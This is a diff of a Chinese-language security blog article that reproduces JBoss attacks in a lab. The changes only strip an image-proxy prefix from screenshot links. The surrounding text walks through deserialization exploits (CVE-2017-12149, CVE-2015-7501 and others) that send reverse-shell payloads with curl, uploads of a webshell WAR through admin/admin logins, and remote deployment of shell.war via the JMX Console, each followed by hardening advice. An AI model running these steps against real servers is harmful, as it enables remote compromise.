@@ -33,17 +33,17 @@ Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循
 
 安装jdk步骤网上教程很多，我就不写了，这里已经装好。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200949.png)image-20210819161330082![]()image-20210819161353705
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200949.png)image-20210819161330082![]()image-20210819161353705
 
 ### 2.下载并安装Jboss6
 
 下载jboss-6.1.0.Final:
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200950.png)image-20210819150959561
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200950.png)image-20210819150959561
 
 将其拉入虚拟机c盘
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200951.png)image-20210820101410679
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200951.png)image-20210820101410679
 
 新建环境变量：
 
@@ -52,7 +52,7 @@ Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循
     JBOSS_HOME值为C:\jboss-6.1.0.Final  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200953.png)image-20210820101555697
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200953.png)image-20210820101555697
 
 path中加入：
 
@@ -61,7 +61,7 @@ path中加入：
     ;%JBOSS_HOME%\bin;  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200954.png)image-20210820101919780
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200954.png)image-20210820101919780
 
 在该目录下双击run.bat启动
 
@@ -74,11 +74,11 @@ path中加入：
 
 出现info即为启动成功，本地可成功访问。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200955.png)image-20210820102615856
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200955.png)image-20210820102615856
 
 此时远程访问是访问不了的，我们需要修改C:\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml的配置实现外网访问。将address="${jboss.bind.address}"改成address="0.0.0.0"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200956.png)image-20210820105055554
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200956.png)image-20210820105055554
 
 保存后重启jboss，即可实现外网访问；
 
@@ -88,7 +88,7 @@ image-20210820105424802
 
 Jboss4和Jboss6的安装步骤一样，唯一不同的是在外网访问的配置文件上修改的地方不太一样；
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200957.png)image-20210820135311614
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200957.png)image-20210820135311614
 
 进去下面目录，修改server.xml，如下图成功访问
 
@@ -97,7 +97,7 @@ Jboss4和Jboss6的安装步骤一样，唯一不同的是在外网访问的配�
     C:\jboss-4.2.3.GA\server\default\deploy\jboss-web.deployer  
     
 
-![]()image-20210820135514710![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200958.png)image-20210820135718708
+![]()image-20210820135514710![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200958.png)image-20210820135718708
 
 ## 三.Jboss渗透
 
@@ -120,13 +120,13 @@ ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查
 
 访问/invoker/readonly，返回500（内部服务器错误——服务器端的CGI、ASP、JSP等程序发生错误），说明此页面存在反序列化漏洞
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200959.png)image-20210820144055866
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830200959.png)image-20210820144055866
 
 #### 漏洞复现
 
 下载漏洞利用工具：https://github.com/joaomatosf/JavaDeserH2HC
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201000.png)image-20210823090347902
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201000.png)image-20210823090347902
 
 编译（需要java环境）
 
@@ -143,11 +143,11 @@ ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查
 
 这里我已经安装好
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201001.png)image-20210820144519927
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201001.png)image-20210820144519927
 
 开启监听
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201002.png)image-20210820144803249
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201002.png)image-20210820144803249
 
 选择一个Gadget：ReverseShellCommonsCollectionsHashMap，编译并生成序列化数据；生成ReverseShellCommonsCollectionsHashMap.class；
 
@@ -157,7 +157,7 @@ ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查
     va  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201003.png)image-20210823090310580
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201003.png)image-20210823090310580
 
 生成序列化数据ReverseShellCommonsCollectionsHashMap.ser
 
@@ -167,7 +167,7 @@ ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查
     .168.10.65:12345  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201004.png)image-20210823090832540
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201004.png)image-20210823090832540
 
 利用ReverseShellCommonsCollectionsHashMap.ser，以二进制格式发送ReverseShellCommonsCollectionsHashMap.ser包
 
@@ -189,7 +189,7 @@ ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查
     C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201005.png)image-20210823093407062
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201005.png)image-20210823093407062
 
 3.添加如下代码至 http-invoker.sar 下 web.xml的security-constraint 标签中,用于对 http invoker
 组件进行访问控制。
@@ -206,7 +206,7 @@ ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查
     C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201006.png)image-20210823093730532![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201007.png)image-20210823093707651
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201006.png)image-20210823093730532![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201007.png)image-20210823093707651
 
 ### 2.JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）
 
@@ -239,7 +239,7 @@ Commons Collections中的Gadget执行任意代码。
     访问/invoker/JMXInvokerServlet，返回如下页面，说明接口开放，此接口存在反序列化漏洞。  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201008.png)image-20210823092835771
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201008.png)image-20210823092835771
 
 #### 漏洞复现
 
@@ -251,7 +251,7 @@ Commons Collections中的Gadget执行任意代码。
     ellCommonsCollectionsHashMap.ser  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201009.png)image-20210823093222160
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201009.png)image-20210823093222160
 
 成功反弹shell。
 
@@ -292,7 +292,7 @@ httpil/HTTPServerILServlet，CVE-2015-7501的利用路径是/invoker/JMXInvokerS
     curl http://192.168.10.213:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201010.png)image-20210823094553928
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201010.png)image-20210823094553928
 
 成功反弹shell
 
@@ -321,7 +321,7 @@ console/Invoker`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进�
     访问/invoker/EJBInvokerServlet，如果可以访问的到，说明存在漏洞  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201011.png)image-20210823094955346
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201011.png)image-20210823094955346
 
 #### 漏洞复现
 
@@ -332,7 +332,7 @@ console/Invoker`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进�
     curl http://192.168.10.154:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201012.png)image-20210823095326056
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201012.png)image-20210823095326056
 
 ### 5.Administration Console 弱口令
 
@@ -344,17 +344,17 @@ Administration Console管理页面存在弱口令，登录后台可以上传war�
 
 #### 漏洞验证
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201013.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201014.png)image-20210823100247859
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201013.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201014.png)image-20210823100247859
 
 #### 漏洞复现
 
 admin/admin弱口令登录,点击add a new resource上传war包
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201015.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201016.png)image-20210823104115380
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201015.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201016.png)image-20210823104115380
 
 点击war包进入下一层，若状态为stop，则点击start，默认都是start，不需要点。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201017.png)image-20210823104345893
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201017.png)image-20210823104345893
 
 蚁剑成功连接
 
@@ -369,7 +369,7 @@ admin/admin弱口令登录,点击add a new resource上传war包
     C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201018.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201018.png)
 
 或者删除Administration Console页面
 
@@ -405,7 +405,7 @@ JBoss 的部署管理的信息，部署上传木马，存在安全隐患。
 
 点击主页的JMX Console进入页面
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201019.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201019.png)
 
 #### 漏洞复现
 
@@ -413,11 +413,11 @@ Jboss4.x的复现：
 
 kali开启远程服务，为了下面部署war包
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201020.png)image-20210823115736527
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201020.png)image-20210823115736527
 
 进入JXM Console之后，找到jboss.deployment
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201021.png)image-20210823111537878
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201021.png)image-20210823111537878
 
 点进去找到void addURL(),输入远程war包链接之后，点击invoke
 
@@ -425,25 +425,25 @@ kali开启远程服务，为了下面部署war包
 
 回到这个页面上方，点击Apply Changes
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201022.png)image-20210823121833925
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201022.png)image-20210823121833925
 
 返回到JMX Console页面，等待一会，刷新后可以看见部署成功
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201023.png)image-20210823122437357
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201023.png)image-20210823122437357
 
 蚁剑成功连接
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201024.png)image-20210823122620639
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201024.png)image-20210823122620639
 
 Jboss6.x的复现：
 
 步骤差不多一样
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201025.png)image-20210823122818531![]()
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201025.png)image-20210823122818531![]()
 
 在该页面找到methodindex为17or19的deploy，填写远程war包的地址进行远程部署
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201026.png)image-20210823130424900![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201027.png)image-20210823130758283![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201028.png)image-20210823130823043![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201029.png)image-20210823131048341
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201026.png)image-20210823130424900![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201027.png)image-20210823130758283![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201028.png)image-20210823130823043![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201029.png)image-20210823131048341
 
 或者是直接运行下面的语句部署即可
 
@@ -453,7 +453,7 @@ Jboss6.x的复现：
     em:service=MainDeployer&methodIndex=17&arg0=http://192.168.10.65/shell.war  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201030.png)image-20210823131823568
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201030.png)image-20210823131823568
 
 蚁剑成功连接
 
@@ -466,7 +466,7 @@ Jboss6.x的复现：
     C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201031.png)image-20210823131904293
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201031.png)image-20210823131904293
 
 #### 安全防护
 
@@ -493,13 +493,13 @@ console/HtmlAdaptor`路径对外开放，并且没有任何身份验证机制，
     输⼊url:http://192.168.10.213:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository定位到void store()  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201032.png)image-20210823133106427
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201032.png)image-20210823133106427
 
 分别向四个参数传入内容：
 
 p1传入的部署war包的名字，p2传入的是上传文件的文件名，p3传入的是上传文件的格式，p4传入的是上传文件的内容
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201033.png)image-20210823134213929
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201033.png)image-20210823134213929
 
 点击invoke
 
@@ -507,7 +507,7 @@ p1传入的部署war包的名字，p2传入的是上传文件的文件名，p3�
 
 经过测试，已经写入，但是目录底层不对，跳转不过去，无法上线蚁剑，这是个问题，暂时保留，有师傅有解决方法可以告诉我一下，万分感谢。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201034.png)image-20210823142321972![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201035.png)image-20210823135236215
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201034.png)image-20210823142321972![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201035.png)image-20210823135236215
 
 #### 安全防护
 
@@ -534,7 +534,7 @@ Server和其他java平台、框架、应用程序等中的漏洞的工具。
 
 输入yes即可
 
-![]()image-20210823141601720![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201036.png)image-20210823141649693
+![]()image-20210823141601720![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201036.png)image-20210823141649693
 
 成功交互。
 
@@ -550,7 +550,7 @@ Server和其他java平台、框架、应用程序等中的漏洞的工具。
 
  **     每日发布 红队攻防技术文章、蓝队防守技术文章、ctf安全赛事技术文章、安全运维基线文章、以及不定期的安全类书籍抽奖～**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201037.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210830201037.png)
 ****
 
 预览时标签不可点
